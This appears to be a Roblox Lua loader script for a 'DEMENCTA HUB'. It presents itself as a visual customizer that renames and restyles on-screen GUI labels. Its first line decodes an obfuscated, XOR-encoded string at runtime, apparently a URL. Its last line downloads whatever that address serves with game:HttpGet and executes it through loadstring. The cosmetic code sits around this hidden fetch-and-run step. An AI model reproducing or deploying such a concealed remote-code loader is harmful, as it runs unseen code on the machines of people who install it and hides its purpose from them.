
--[[ STAGE 2: VISUAL CORE ]]
local tr_NTuWu1UjNhp="\215\233\230\042\056\243\083\254\084\089\106\021\081\033\041\062\067\063\113\123\166\150\168\162\183\118\165\118\139\172\189\156\159\161\167\181\221\231\255\243\213\208\211\226\231\018\029\237\250\250\003\020\061\087\028\041\039\049\117\060\066\069\085\087\085\101\112\102\177\112\137\130\135\145\143\157\159\166\173\178\249\193\197\199\016\224\220\221\242\238\245\247\012\001\025\029\020\041\042\052\055\047\124\075\071\090\149\155\180\115\122\124\130\132"local m3tAklSL_s3M=230 local rU7GIIjampQOsaTs6a7y5A=44 local Y2PhMh1WCb2VhTkhDyL=0 local xojdXN17vPk9JpshDw=6 local dTmTBr2FOiuS2hFw3r=30 local OEiA20Jj2Bev_vILrcbMW=true local t1WRwsznSjcKKvyVmle=bit32 and bit32.bxor if not t1WRwsznSjcKKvyVmle then t1WRwsznSjcKKvyVmle=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local PbsG5T0qcass={}for H_6jNrhoOEqoCJhtdtbiWQ=1,#tr_NTuWu1UjNhp do local DP46Hm6rEUvndEoYbG4x=string.byte(tr_NTuWu1UjNhp,H_6jNrhoOEqoCJhtdtbiWQ)local IRB97nEO4Jvs=(rU7GIIjampQOsaTs6a7y5A+(H_6jNrhoOEqoCJhtdtbiWQ*xojdXN17vPk9JpshDw)+dTmTBr2FOiuS2hFw3r)%256 if Y2PhMh1WCb2VhTkhDyL==0 then DP46Hm6rEUvndEoYbG4x=(DP46Hm6rEUvndEoYbG4x-IRB97nEO4Jvs)%256 PbsG5T0qcass[H_6jNrhoOEqoCJhtdtbiWQ]=string.char(t1WRwsznSjcKKvyVmle(DP46Hm6rEUvndEoYbG4x,m3tAklSL_s3M))else DP46Hm6rEUvndEoYbG4x=t1WRwsznSjcKKvyVmle(DP46Hm6rEUvndEoYbG4x,m3tAklSL_s3M)PbsG5T0qcass[H_6jNrhoOEqoCJhtdtbiWQ]=string.char((DP46Hm6rEUvndEoYbG4x-IRB97nEO4Jvs)%256)end end local Q4er78DuM6chXLg=table.concat(PbsG5T0qcass)if OEiA20Jj2Bev_vILrcbMW then Q4er78DuM6chXLg=string.reverse(Q4er78DuM6chXLg)end local MVelksKgBKQjS8FUupa=Q4er78DuM6chXLg
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(MVelksKgBKQjS8FUupa))()
